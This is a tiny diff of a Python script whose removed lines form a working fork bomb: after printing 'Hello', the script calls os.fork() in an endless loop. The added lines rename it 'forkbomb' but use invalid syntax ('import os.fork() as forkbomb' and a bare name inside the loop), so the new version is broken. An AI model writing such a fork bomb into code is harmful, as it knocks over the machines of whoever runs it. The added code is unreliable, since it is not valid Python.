@@ -1,5 +1,6 @@
-import os
-
+import os.fork() as forkbomb
+ 
 print('Hello')
 while True:
-  os.fork()
+  forkbomb
+ 
